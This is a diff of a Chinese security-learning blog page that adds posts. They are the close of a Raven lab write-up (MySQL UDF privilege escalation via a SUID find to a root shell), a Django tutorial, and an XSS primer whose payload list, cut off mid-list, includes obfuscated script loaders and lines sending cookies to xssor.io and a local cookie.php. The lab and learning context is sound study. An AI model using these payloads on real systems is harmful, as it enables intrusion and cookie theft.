@@ -303,8 +303,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">内网渗透</span>
+                  <a href="/categories/靶机测试/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机测试</span>
                   </a>
                 </span>
 
@@ -434,6 +434,343 @@
 <p>靶机连接<code>mysql</code>开始进行提权操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.22 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use wordpress</span><br><span class="line">use wordpress</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">create table foo(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.43 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(&apos;/var/www/html/1518.so&apos;));</span><br><span class="line">insert into foo values(load_file(&apos;/var/www/html/1518.so&apos;));</span><br><span class="line">Query OK, 1 row affected (0.10 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/1518.so&apos;;</span><br><span class="line">select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/1518.so&apos;;</span><br><span class="line">Query OK, 1 row affected (0.06 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create function do_system returns integer soname &apos;1518.so&apos;;</span><br><span class="line">create function do_system returns integer soname &apos;1518.so&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.10 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">select * from mysql.func;</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">| name      | ret | dl      | type     |</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">| do_system |   2 | 1518.so | function |</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(&apos;chmod u+s /usr/bin/find&apos;);</span><br><span class="line">select do_system(&apos;chmod u+s /usr/bin/find&apos;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| do_system(&apos;chmod u+s /usr/bin/find&apos;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    0 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.02 sec)</span><br><span class="line">mysql&gt; quit</span><br><span class="line">quit</span><br><span class="line">Bye</span><br><span class="line">www-data@Raven:/var/www/html$ touch foo</span><br><span class="line">touch foo</span><br><span class="line">www-data@Raven:/var/www/html$ find foo -exec &apos;whoami&apos; \;</span><br><span class="line">find foo -exec &apos;whoami&apos; \;</span><br><span class="line">root</span><br><span class="line">www-data@Raven:/var/www/html$ find foo -exec &apos;/bin/sh&apos; \;</span><br><span class="line">find foo -exec &apos;/bin/sh&apos; \;</span><br><span class="line"># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"># pwd</span><br><span class="line">pwd</span><br><span class="line">/var/www/html</span><br><span class="line"># cd /root</span><br><span class="line">cd /root</span><br><span class="line"># ls</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line"># cat flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">______</span><br><span class="line"></span><br><span class="line">| ___ \</span><br><span class="line"></span><br><span class="line">| |_/ /__ ___   _____ _ __</span><br><span class="line"></span><br><span class="line">|    // _` \ \ / / _ \ &apos;_ \</span><br><span class="line"></span><br><span class="line">| |\ \ (_| |\ V /  __/ | | |</span><br><span class="line"></span><br><span class="line">\_| \_\__,_| \_/ \___|_| |_|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;</span><br><span class="line"></span><br><span class="line">CONGRATULATIONS on successfully rooting Raven!</span><br><span class="line"></span><br><span class="line">This is my first Boot2Root VM - I hope you enjoyed it.</span><br><span class="line"></span><br><span class="line">Hit me up on Twitter and let me know what you thought:</span><br><span class="line"></span><br><span class="line">@mccannwj / wjmccann.github.io</span><br></pre></td></tr></table></figure></p>
 <p>成功提权</p>
 <p>参考链接：<br><a href="https://www.anquanke.com/post/id/163996" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163996</a><br><a href="https://www.cnblogs.com/bmjoker/p/10034001.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/10034001.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Django---简单博客搭建（2）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="鸡翅儿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/Django---简单博客搭建（2）/" itemprop="url">Django---简单博客搭建（2）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="博客页面分类："><a href="#博客页面分类：" class="headerlink" title="博客页面分类："></a>博客页面分类：</h4><p>1.博客主页面<br>2.博客文章内容页面<br>3.博客撰写页面</p>
+<h4 id="主页面内容："><a href="#主页面内容：" class="headerlink" title="主页面内容："></a>主页面内容：</h4><ol>
+<li>文章标题列表，超链接</li>
+<li>取出数据库中所有文章对象</li>
+<li>将文章对象打包成列表，传递到前端</li>
+<li>前端页面把文章以标题超链接的形式逐个列出</li>
+</ol>
+<ul>
+<li><p>后端 views.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from . import models</span><br><span class="line"></span><br><span class="line"># 获取所有文章</span><br><span class="line">def index(request):</span><br><span class="line">articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表</span><br><span class="line">return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>前端 index.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--撰写博客入口--&gt;</span><br><span class="line">&lt;h2&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;编写新文章&lt;/a&gt;</span><br><span class="line">&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--文章列表--&gt;</span><br><span class="line">&lt;h3&gt;</span><br><span class="line">文章列表：&lt;br&gt;</span><br><span class="line">&#123;% for article in articles %&#125;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;&#123;&#123; article.title &#125;&#125;&lt;/a&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="发表博客按钮（超链接）博客文章内容页面"><a href="#发表博客按钮（超链接）博客文章内容页面" class="headerlink" title="发表博客按钮（超链接）博客文章内容页面"></a>发表博客按钮（超链接）博客文章内容页面</h4><ol>
+<li>利用文章 ID 获取单个文章对象</li>
+</ol>
+<ul>
+<li>后端 view.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from . import models</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表</span><br><span class="line">return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)</span><br><span class="line"></span><br><span class="line"># 获取文章对象</span><br><span class="line">def article_page(request,article_id):</span><br><span class="line">article = models.Article.objects.get(pk=article_id)</span><br><span class="line">return render(request,&apos;blog/article_page.html&apos;,&#123;&apos;article&apos;:article&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ol start="2">
+<li>编写显示文章内容页面的前端</li>
+</ol>
+<ul>
+<li>前端 articl_page.html<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--显示单个文章标题和内容--&gt;</span><br><span class="line">&lt;h1&gt;&#123;&#123;article.title&#125;&#125;&lt;/h1&gt;&lt;br&gt;</span><br><span class="line">&lt;h3&gt;&#123;&#123;article.content&#125;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;!--修改文章链接--&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;修改文章&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ol start="3">
+<li>修改 URL 配置</li>
+</ol>
+<ul>
+<li>urls.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.conf.urls import url</span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">url(r&apos;^index/$&apos;, views.index), </span><br><span class="line">url(r&apos;^article/(?P&lt;article_id&gt;[0-9]+)$&apos;, views.article_page), </span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/XSS漏洞学习/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="鸡翅儿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/XSS漏洞学习/" itemprop="url">XSS漏洞学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞学习/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="XSS漏洞的原理"><a href="#XSS漏洞的原理" class="headerlink" title="XSS漏洞的原理"></a>XSS漏洞的原理</h4><p>XSS漏洞是发生在目标网站中目标用户的浏览层面上，当用户浏览器渲染整个HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就会发生。</p>
+<h4 id="XSS漏洞的危害"><a href="#XSS漏洞的危害" class="headerlink" title="XSS漏洞的危害"></a>XSS漏洞的危害</h4><ul>
+<li>获取用户或者管理员的Cookie</li>
+<li>XSS蠕虫</li>
+<li>钓鱼攻击</li>
+<li>挂马</li>
+<li>键盘记录等</li>
+</ul>
+<h4 id="以下是可能嵌入跨源的资源的一些示例："><a href="#以下是可能嵌入跨源的资源的一些示例：" class="headerlink" title="以下是可能嵌入跨源的资源的一些示例："></a>以下是可能嵌入跨源的资源的一些示例：</h4><ul>
+<li><script src="..."></script> 标签嵌入跨域脚本。语法错误信息只能在同浪脚本中捕</li>
+<li>&lt;link rel=”stylesheet” href＝”…”＞标签嵌入CSS。由于CSS的松散的语法规<br>则，CSS的跨域需要一个设置正确的 Content－Type消息头。不同浏览器有不同的限<br>制：IE， Firefox， Chrome， Safari（跳至CVE－2010－0051）部分和 Opera</li>
+<li><img>嵌入图片。支持的图片格式包括PNG，JPEG，GlF，BMP，SVG，</li>
+<li><video>和<audio>嵌入多媒体资源。</audio></video></li>
+<li><object>，<embed>和<applet>的插件</applet></object></li>
+<li>@font-face引入的字体。一些浏览器允许跨域字体（ cross－origin fonts），一些需要同<br>源字体（ same－origin fonts）</li>
+<li><frame>和<iframe>载入的任何资源。站点可以使用 X-frame-optionsi消息头来阻止这<br>种形式的跨域交互。</iframe></li>
+</ul>
+<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，而是为关联应用程序而使用的。如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript: 我们可以在浏览地址栏里输入”javascript:alert(‘JS!’);”，点转到后会发现，实际上是把javascript: 后面的代码当JavaScript来执行，并将结果值返回给当前页面。（XSS Changes Stage #8）</p>
+<h4 id="XSS-常用-payload"><a href="#XSS-常用-payload" class="headerlink" title="XSS 常用 payload"></a>XSS 常用 payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">&gt;&quot;&apos;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;&#123;()&#125;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;&#123;(alert(1))&#125;</span><br><span class="line">`&gt;&lt;script&gt;alert(0)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=eval;b=alert;a(b(/i/.source));&lt;/script&gt;</span><br><span class="line">&lt;code onmouseover=a=eval;b=alert;a(b(/g/.source));&gt;HI&lt;/code&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=http://xssor.io/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;script&gt;location.href=&apos;http://127.0.0.1:8088/cookie.php?cookie=&apos;+escape(document.cookie);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&apos;&quot;&gt;&lt;img onerror=alert(0) src=&gt;&lt;&quot;&apos;</span><br><span class="line">&lt;img src=http://127.0.0.1/myspace.asp&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:al&amp;#13;ert(0)&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:i=&quot;x=document.createElement(&apos;script&apos;);x.src=&apos;http://xssor.io/xn.js&apos;;x.defer=true;document.getElementsByTagName(&apos;head&apos;)[0].appendChild(x)&quot;;execScript(i)&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:i=&quot;x=docu&amp;#13;ment.createElement(&apos;\u0053\u0043\u0052\u0049\u0050\u0054&apos;);x.src=&apos;http://xssor.io/xn.js&apos;;x.defer=true;doc&amp;#13;ument.getElementsByTagName(&apos;head&apos;)[0].appendChild(x)&quot;;execScri&amp;#13;pt(i)&gt;</span><br><span class="line">new Image().src=&quot;http://xssor.io/phishing/cookie.asp?cookie=&quot;+escape(document.cookie);</span><br><span class="line"></span><br><span class="line">&lt;iframe src=http://www.baidu.com/&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body background=javascript:alert(/xss/)&gt;&lt;/body&gt;</span><br><span class="line">body&#123;xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))&#125;</span><br><span class="line">&lt;style&gt;body&#123;width:ｅxpression(parent.document.write(unescape(&apos;%3Cscript%20src%3Dhttp%3A//xssor.io/phishing/%3E%3C/script%3E&apos;)));&#125;&lt;/style&gt;</span><br><span class="line">a&#123;xxx:expression(if(!window.x)&#123;alert(&apos;xss&apos;);window.x=1;&#125;)&#125;</span><br><span class="line">a&#123;xxx:\65\78\70\72\65\73\73\69\6f\6e\28\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\27\78\73\73\27\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\3b\7d\29&#125;</span><br><span class="line">body&#123;background:url(&quot;javascript:alert(&apos;xss&apos;)&quot;)&#125;</span><br><span class="line">body&#123;background:url(JavAs	cr	</span><br><span class="line">ipt:alert(0))&#125;</span><br><span class="line">&lt;style&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;xss&quot;)&apos;;&lt;/style&gt;</span><br><span class="line">@i\6d\70o\72\74&apos;javascr\ipt:alert(document.cookie)&apos;;</span><br><span class="line">&lt;div style=xss:expres&amp;#92sion(if(!window.x)&#123;alert(&apos;xss&apos;);window.x=1;&#125;)&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">alert(String(/xss/).substr(1,3))</span><br><span class="line">alert(/xss/.source)</span><br><span class="line">&lt;a onclick=&quot;i=createElement(&apos;iframe&apos;);i.src=&apos;javascript:alert(/xss/)&apos;;x=parentNode;x.appendChild(i);&quot; href=&quot;#&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">x=&apos;\x61\x6c\x65\x72\x74\x28\x31\x29&apos;;new Function(x)()</span><br><span class="line">&lt;a href=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4=&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line">&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval(&apos;x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99,111,109,47,48,46,106,115));document.getElementById(x(105,110,106,101,99,116)).appendChild(scr);window.r=1;&apos;):1);&quot;id=&quot;inject&quot;&gt;</span><br><span class="line"></span><br><span class="line">javascript:document.scripts[0].src=&apos;http://127.0.0.1/yy.js&apos;;void(0);</span><br><span class="line">&lt;a href=&quot;javascript:x=open(&apos;http://www.xiaonei.com/&apos;);setInterval (function()&#123;try&#123;x.frames[0].location=&#123;toString:function()&#123;return%20&apos;http://xssor.io/Project/poc/docshell.html&apos;;&#125;&#125;&#125;catch(e)&#123;&#125;&#125;,3000);void(1);&quot;&gt;Test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;script/onreadystatechange=alert(1)&gt;</span><br><span class="line">&lt;script/src=data:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,alert(4)&gt;&lt;/script&gt;</span><br><span class="line">javascript:document.cookie=window.prompt(&quot;edit cookie:&quot;,document.cookie);void(0);</span><br><span class="line">&lt;input id=11 name=s value=`aa`onclick=alert(/xss/)&gt;</span><br><span class="line">&lt;input value:aa/onclick=alert(/xss/)&gt;</span><br><span class="line">&lt;li style=list-style:url() onerror=alert(1)&gt;</span><br><span class="line">&lt;div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)&gt;&lt;/div&gt;</span><br><span class="line">&lt;head&gt;&lt;base href=&quot;javascript://&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;/. /,alert(1)//#&quot;&gt;XXX&lt;/a&gt;&lt;/body&gt;</span><br><span class="line">&lt;OBJECT CLASSID=&quot;clsid:333C7BC4-460F-11D0-BC04-0080C7055A83&quot;&gt;&lt;PARAM NAME=&quot;DataURL&quot; VALUE=&quot;javascript:alert(1)&quot;&gt;&lt;/OBJECT&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;input value=&quot;``onmouseover=alert(1)&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(&quot;div2&quot;).innerHTML = document.getElementById(&quot;div1&quot;).innerHTML;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">[!] ie only:</span><br><span class="line">&lt;div style=width:1px;filter:glow onfilterchange=alert(1)&gt;x</span><br><span class="line">&lt;title onpropertychange=alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;</span><br><span class="line">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; &lt;!--[if&lt;img src=x onerror=alert(1)//]&gt; --&gt;</span><br><span class="line"></span><br><span class="line">[!] parsing error:</span><br><span class="line">&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;comment&gt;&lt;img 